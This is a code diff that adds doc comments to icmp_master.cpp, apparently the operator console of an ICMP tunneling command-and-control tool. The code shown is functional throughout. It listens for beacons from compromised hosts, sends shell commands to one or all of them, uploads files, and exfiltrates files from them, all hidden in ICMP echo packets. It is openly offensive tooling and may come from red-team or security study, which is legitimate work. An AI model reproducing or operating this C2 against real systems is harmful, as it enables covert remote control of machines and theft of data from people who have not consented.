@@ -1,3 +1,15 @@
+/**
+ * @file icmp_master.cpp
+ * @author Jacob Doll (thedolleyllama)
+ * 
+ * ICMP C2
+ * Listens for beacons from hosts and sends commands to 
+ * them. Currently supports:
+ * - sending commands and receiving output
+ * - sending files to target machine
+ * - receiving files from target machine
+ */
+
 #include <iostream>
 #include <cstdint>
 #include <cstring>
@@ -21,11 +33,20 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 
+/** Currently connected hosts */
 static std::map<std::string, std::string> active_connections;
+/** Expected host machines */
 static std::map<std::string, std::string> hosts;
-static bool listening = false;
 static std::mutex active_connections_mutex;
+static bool listening = false;
 
+/**
+ * @brief Calculates checksum of an array of data.
+ * 
+ * @param vdata pointer to array
+ * @param size size of array
+ * @return 2 byte checksum
+ */
 static uint16_t checksum(void *vdata, uint32_t size)
 {
   uint8_t *data = (uint8_t *)vdata;
@@ -84,6 +105,12 @@ static uint16_t checksum(void *vdata, uint32_t size)
   return ~acc;
 }
 
+/**
+ * @brief Splits an string into an array using a space as the delimiter.
+ * 
+ * @param input string to split
+ * @return vector of strings
+ */
 std::vector<std::string> split_input(std::string &input)
 {
   std::vector<std::string> ret;
@@ -95,27 +122,42 @@ std::vector<std::string> split_input(std::string &input)
   return ret;
 }
 
+/**
+ * @brief Sends an ICMP echo reply to a specified ip.
+ * 
+ * Allows for user to specify the data field.
+ * 
+ * @param sockfd socket file descriptor to use
+ * @param dst destination IPv4 string to use
+ * @param buf buffer to fill data section with
+ * @param size size of buffer to send
+ */
 long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
 {
-  uint8_t out[1024];
+  uint8_t out[1024]; // outgoing buffer used to send ping
+
   icmphdr *icmp = (icmphdr *)out;
-  icmp->type = 0;
+  icmp->type = 0; // reply
   icmp->code = 0;
   icmp->checksum = 0;
   icmp->un.echo.sequence++;
 
+  // copy buffer to data section
   if (buf && size > 0)
   {
     memcpy(&out[sizeof(icmphdr)], buf, size);
   }
 
+  // calculate checksum and change byte order
   icmp->checksum = htons(checksum(out, sizeof(icmphdr) + size));
 
+  // construct IP address from dst string
   sockaddr_in addr_;
   addr_.sin_family = AF_INET;
   addr_.sin_port = htons(0);
   addr_.sin_addr.s_addr = inet_addr(dst.c_str());
 
+  // send data
   long ret;
   if ((ret = sendto(sockfd, out, sizeof(icmphdr) + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
   {
@@ -124,6 +166,16 @@ long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
   return ret;
 }
 
+/**
+ * @brief Recieves an ICMP echo request and stores the IP.
+ * 
+ * Can read data entry into the specified buffer
+ * 
+ * @param sockfd socket file descriptor to use
+ * @param src string to store source IPv4 in
+ * @param buf buffer to fill with data section
+ * @param size size of buffer to receive into
+ */
 long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
 {
   long ret = 0;
@@ -152,8 +204,14 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
   return ret - sizeof(iphdr) - sizeof(icmphdr);
 }
 
+/**
+ * @brief Listener thread for receiving beacons.
+ * 
+ * Listens for hosts to ping the server.
+ */
 void listen_task()
 {
+  // open a socket
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
   if (sockfd == -1)
   {
@@ -161,10 +219,14 @@ void listen_task()
     std::exit(-1);
   }
 
+  // create a buffer to store received data
   uint8_t in[1024];
   while (1)
   {
+    // fill buffer with zeroes
     memset(in, 0, 1024);
+
+    // receive a ping and store the ip addres
     std::string src_ip;
     ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
 
@@ -173,6 +235,7 @@ void listen_task()
       char *hostname_ = (char *)in;
       std::string hostname = hostname_;
 
+      // only store hostname into active connections list if a beacon is sent
       auto split = split_input(hostname);
       if (split.at(0).compare("(beacon)") == 0)
       {
@@ -183,8 +246,15 @@ void listen_task()
   }
 }
 
+/**
+ * @brief Sends a command to be executed on a designated ip address
+ * 
+ * @param dst ip address to send command
+ * @param command string command to execute
+ */
 void send_command(const std::string &dst, const std::string &command)
 {
+  // open a socket
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
   if (sockfd == -1)
   {
@@ -192,14 +262,18 @@ void send_command(const std::string &dst, const std::string &command)
     exit(-1);
   }
 
+  // prepend command with run so the client knows what to do with this packet
   std::string cmd = "run ";
   cmd.append(command);
 
+  // send the commmand to be executed
   send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);
 
+  // listen for response packets
   while (1)
   {
     uint8_t in[512];
+    // receive a ping and store the ip addres
     std::string src_ip;
     ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
 
@@ -208,6 +282,7 @@ void send_command(const std::string &dst, const std::string &command)
 
     if (num_bytes > 0)
     {
+      // put command ouput to stdout
       char *str_ = (char *)in;
       std::string str(str_, num_bytes);
       std::fputs(str.c_str(), stdout);
@@ -219,8 +294,16 @@ void send_command(const std::string &dst, const std::string &command)
   }
 }
 
+/**
+ * @brief Sends a file to be copied to a designated file location on the host
+ * 
+ * @param dst ip address to send file
+ * @param src_file filename of file to copy
+ * @param dst_file filename of file to put on host
+ */
 void send_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
 {
+  // open a socket
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
   if (sockfd == -1)
   {
@@ -228,11 +311,14 @@ void send_file(const std::string &dst, const std::string &src_file, const std::s
     exit(-1);
   }
 
+  // prepend command with file so the client knows what to do with this packet
   std::string cmd = "file ";
   cmd.append(dst_file);
 
+  // send packet to host
   send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);
 
+  // open file on machine to read
   FILE *fp = fopen(src_file.c_str(), "rb");
   uint8_t out[512];
   if (fp == NULL)
@@ -244,6 +330,7 @@ void send_file(const std::string &dst, const std::string &src_file, const std::s
   size_t nbytes;
   do
   {
+    // send file 512 bytes at a time to the host
     nbytes = fread(out, 1, sizeof(out), fp);
     send_ping(sockfd, dst, out, nbytes);
   } while (nbytes != 0);
@@ -251,8 +338,16 @@ void send_file(const std::string &dst, const std::string &src_file, const std::s
   send_ping(sockfd, dst, NULL, 0);
 }
 
+/**
+ * @brief Receives a file from a host machine to be saved at a designated location
+ * 
+ * @param dst ip address to receive file from
+ * @param src_file filename of file to copy into
+ * @param dst_file filename of file to receive from on host
+ */
 void receive_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
 {
+  // open a socket
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
   if (sockfd == -1)
   {
@@ -260,11 +355,14 @@ void receive_file(const std::string &dst, const std::string &src_file, const std
     exit(-1);
   }
 
+  // prepend command with exfil so the client knows what to do with this packet
   std::string cmd = "exfil ";
   cmd.append(src_file);
 
+  // send packet to host
   send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);
 
+  // open file to be written to
   FILE *fp = fopen(dst_file.c_str(), "wb+");
   if (fp == NULL)
   {
@@ -275,6 +373,7 @@ void receive_file(const std::string &dst, const std::string &src_file, const std
   while (1)
   {
     uint8_t in[512];
+    // receive file 512 bytes at a time and write to file
     std::string src_ip;
     ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
 
@@ -293,6 +392,11 @@ void receive_file(const std::string &dst, const std::string &src_file, const std
   }
 }
 
+/**
+ * @brief ping an ip
+ * 
+ * @param dst ip to send ping to
+ */
 void ping(const std::string &dst)
 {
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
@@ -304,6 +408,13 @@ void ping(const std::string &dst)
   send_ping(sockfd, dst, NULL, 0);
 }
 
+/**
+ * @brief save currently connected hosts to file
+ * 
+ * This allows for me to load hosts manually and save state.
+ * 
+ * @param filename filename of file to save to
+ */
 void export_connections(const std::string &filename)
 {
   std::ofstream file(filename);
@@ -319,6 +430,13 @@ void export_connections(const std::string &filename)
   }
 }
 
+/**
+ * @brief Load hosts from file
+ * 
+ * This allows for me to load hosts manually and save state.
+ * 
+ * @param filename filename of file to load from
+ */
 void load_connections(const std::string &filename)
 {
   std::ifstream file(filename);
@@ -333,6 +451,9 @@ void load_connections(const std::string &filename)
   }
 }
 
+/**
+ * @brief Print help message.
+ */
 void help()
 {
   std::puts("ICMP Master C2!");
@@ -354,21 +475,34 @@ void help()
   std::puts("\texit: exit program!");
 }
 
+/**
+ * @brief Main entry point.
+ * 
+ * Starts command prompt to allow user to interact with hosts.
+ * 
+ * @param argc number of args
+ * @param argv arguments
+ * @return 0 on success, -1 on failure
+ */
 int main(int argc, char **argv)
 {
+  // load hosts from file
   if (argc > 1)
   {
     load_connections(argv[1]);
   }
 
+  // display help message
   help();
 
+  // begin command loop
   while (1)
   {
     std::string input;
     std::cout << "> ";
     std::getline(std::cin, input);
 
+    // split input by spaces and save into an vector
     auto input_arr = split_input(input);
 
     if (input_arr.at(0).compare("help") == 0)
@@ -377,6 +511,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("start") == 0)
     {
+      // starts the listening loop for beacons
       if (listening)
       {
         std::puts("Already listening!");
@@ -388,6 +523,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("list") == 0)
     {
+      // lists active hosts
       std::puts("Listing active machines!");
       std::lock_guard<std::mutex> guard(active_connections_mutex);
 
@@ -399,6 +535,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("hosts") == 0)
     {
+      // lists hosts that have been loaded from a file
       std::puts("Listing host machines!");
 
       auto it = hosts.begin();
@@ -409,6 +546,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("ping") == 0)
     {
+      // ping an individual host by ip
       if (input_arr.size() < 2)
       {
         std::puts("usage: ping [ip]");
@@ -419,6 +557,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("pingh") == 0)
     {
+      // ping an individual host by hostname
       if (input_arr.size() < 2)
       {
         std::puts("usage: pingh [host]");
@@ -430,6 +569,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("beacon") == 0)
     {
+      // send a ping to all hosts in the host file
       std::lock_guard<std::mutex> guard(active_connections_mutex);
       active_connections.clear();
       auto it = hosts.begin();
@@ -441,6 +581,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("run") == 0)
     {
+      // run a command on a host by hostname
       if (input_arr.size() < 3)
       {
         std::puts("usage: run [host] [command]");
@@ -465,6 +606,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("runall") == 0)
     {
+      // run a command on all hosts
       if (input_arr.size() < 2)
       {
         std::puts("usage: runall [command]");
@@ -493,6 +635,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("file") == 0)
     {
+      // send a file over ICMP to host
       if (input_arr.size() < 4)
       {
         std::puts("usage: file [host] [src] [dst]");
@@ -507,6 +650,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("exfil") == 0)
     {
+      // exfiltrate a file from a host
       if (input_arr.size() < 4)
       {
         std::puts("usage: exfil [host] [src] [dst]");
@@ -521,6 +665,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("export") == 0)
     {
+      // export currently connected hosts to a file
       std::string filename;
       if (input_arr.size() > 1)
       {
@@ -528,6 +673,7 @@ int main(int argc, char **argv)
       }
       else
       {
+        // default filename
         filename = "exported.txt";
       }
       std::cout << "Exporting to: " << filename << "\n";
@@ -535,6 +681,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("load") == 0)
     {
+      // load a host config from a filename
       if (input_arr.size() < 2)
       {
         std::puts("usage: load [filename]");
@@ -545,6 +692,7 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("clear") == 0)
     {
+      // clear the currently connected hosts
       std::puts("Clearing active connections");
       std::lock_guard<std::mutex> guard(active_connections_mutex);
       active_connections.clear();
